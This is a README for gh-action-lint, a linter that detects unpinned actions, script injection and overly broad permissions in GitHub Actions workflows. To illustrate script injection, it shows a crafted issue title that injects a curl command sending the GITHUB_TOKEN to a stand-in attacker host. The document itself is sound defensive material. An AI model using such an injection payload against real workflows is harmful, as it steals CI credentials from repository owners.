# gh-action-lint

A linter for GitHub Actions workflows that detects common security vulnerabilities. Currently checks for:

- **Unpinned actions** — actions referenced by a tag or branch name rather than a full commit SHA
- **Script injection** — user-controlled data embedded directly in `run:` steps
- **Overly broad permissions** — workflows that omit `permissions:` or use `write-all`

## Installation

```sh
go install github.com/funcan/gh-action-lint@latest
```

Or build from source:

```sh
git clone https://github.com/funcan/gh-action-lint
cd gh-action-lint
go build -o gh-action-lint .
```

## Usage

Run inside any git repository:

```sh
gh-action-lint check
```

To also check whether the actions your workflows depend on are themselves using pinned refs:

```sh
gh-action-lint check --recursive
```

Set `GITHUB_TOKEN` to authenticate requests to GitHub and avoid rate limits:

```sh
GITHUB_TOKEN=$(gh auth token) gh-action-lint check --recursive
```

To skip specific checks, use `--disable-check` with a comma-separated list of check names:

```sh
gh-action-lint check --disable-check permissions
gh-action-lint check --disable-check pins,injections
```

Valid check names are `pins`, `injections`, and `permissions`.

### Example output

```
.github/workflows/ci.yml:7: action not pinned to a SHA: actions/checkout@v4
.github/workflows/ci.yml:9: script injection: ${{ github.event.issue.title }} used directly in run step
.github/workflows/ci.yml:1: no top-level permissions declared; GITHUB_TOKEN defaults to the repository's base permissions (use permissions: {} for least privilege)
```

Exits with code `1` if any warnings are found, making it suitable for use in CI.

## Checks

### Unpinned actions

Pinning to a tag like `@v4` or `@main` means your workflow silently changes if the upstream maintainer (or an attacker who has compromised their account) moves the tag. This is a supply chain attack vector — your CI pipeline executes whatever code the tag now points to.

Pinning to a full 40-character commit SHA gives you a tamper-resistant, fully reproducible build. The tag can be kept as a comment for readability:

```yaml
# Unsafe — tag can be silently moved
- uses: actions/checkout@v4

# Safe — exact content is locked in
- uses: actions/checkout@11bd317f7bc71dd3eee3f1bf1c58bc03de17e433 # v4
```

The following `uses:` patterns are not flagged:

| Pattern | Example | Reason |
|---|---|---|
| Local actions | `./my-action` | No remote ref |
| Docker images | `docker://alpine:3.18` | Not a GitHub Action |

### Script injection

GitHub Actions expressions (`${{ ... }}`) are evaluated **before** the shell runs. If a user-controlled value — such as an issue title or PR branch name — is placed directly inside a `run:` step, an attacker can break out of the intended command and run arbitrary code in your CI environment.

#### Example attack

A workflow that automatically labels issues:

```yaml
on: issues
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Processing issue: ${{ github.event.issue.title }}"
```

An attacker opens an issue with the title:

```
a"; curl https://evil.example.com/exfil?token=$GITHUB_TOKEN; echo "
```

The shell sees:

```sh
echo "Processing issue: a"; curl https://evil.example.com/exfil?token=$GITHUB_TOKEN; echo ""
```

The `GITHUB_TOKEN` (and anything else in the environment) is exfiltrated.

#### The fix

Assign the expression to an environment variable first. The shell then receives the value as data, not as part of the command string, so shell metacharacters in the value are harmless:

```yaml
# Unsafe — expression is interpolated into the shell command
- run: echo "${{ github.event.issue.title }}"

# Safe — value is passed via the environment, not interpolated
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```

The following user-controlled contexts are checked: issue/PR titles and bodies, comment and review bodies, commit messages, PR head branch name, discussion titles and bodies, and page names.

### Workflow permissions

Every workflow receives a `GITHUB_TOKEN` that is automatically scoped to the repository. By default its permissions are determined by your repository or organisation settings — which may be broader than a given workflow actually needs.

Declaring `permissions:` explicitly at the top of the workflow applies the principle of least privilege: each workflow gets only what it needs, and nothing more. If a workflow is compromised (e.g., via script injection or a malicious action), a narrowly scoped token limits the blast radius.

`gh-action-lint` warns when:

- **No top-level `permissions:` is declared** — the token's scope depends on organisation/repository defaults, which may grant unintended write access.
- **`permissions: write-all`** at the workflow or job level — this explicitly grants the token write access to every available scope.

#### Examples

```yaml
# Bad — missing permissions block; defaults apply
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd317f7bc71dd3eee3f1bf1c58bc03de17e433 # v4

# Bad — write-all is almost never necessary
permissions: write-all

# Good — empty block grants no permissions at all (safest default)
permissions: {}

# Good — only grant what the workflow actually needs
permissions:
  contents: read
  pull-requests: write
```

Job-level `permissions:` blocks can further restrict a subset of jobs. `gh-action-lint` does not warn about missing job-level permissions when a workflow-level block is already present.

## Ignoring actions

Create a `.gh-lint-ignore` file at the root of your repository to suppress unpinned-action warnings for specific actions. Lines starting with `#` are comments. Script injection warnings are always reported and cannot be suppressed here.

```
# Trusted third-party actions — we accept the tag-pinning risk
actions/checkout
actions/cache@v3   # only suppress this specific ref
```

A pattern without a ref (e.g., `actions/checkout`) matches any ref of that action. A pattern with a ref (e.g., `actions/cache@v3`) matches only that exact ref.

Ignored actions are still traversed during a `--recursive` check, so transitive dependencies of ignored actions are still reported.

## Fixing unpinned actions

Run `fix` to automatically resolve all unpinned refs to their current commit SHA:

```sh
GITHUB_TOKEN=$(gh auth token) gh-action-lint fix
```

Output:

```
.github/workflows/ci.yml:8: actions/checkout@v4 -> actions/checkout@11bd317f... # v4
.github/workflows/ci.yml:9: actions/cache@v3 -> actions/cache@5a3ec84... # v3
```

The original tag is preserved as a comment so the intent remains readable. Already-pinned actions and actions in `.gh-lint-ignore` are left untouched. `GITHUB_TOKEN` is required to resolve refs via the GitHub API.

`fix` also accepts `--disable-check` to skip specific fixes:

```sh
gh-action-lint fix --disable-check permissions   # only pin actions, don't add permissions: {}
gh-action-lint fix --disable-check pins          # only add permissions: {}, don't pin actions
```

Note: `injections` is not a valid target for `fix` (there is no automatic fix for script injection).

To find a SHA manually:

```sh
git ls-remote https://github.com/actions/checkout refs/tags/v4
```

## License

GPLv2 — see [LICENSE](LICENSE).
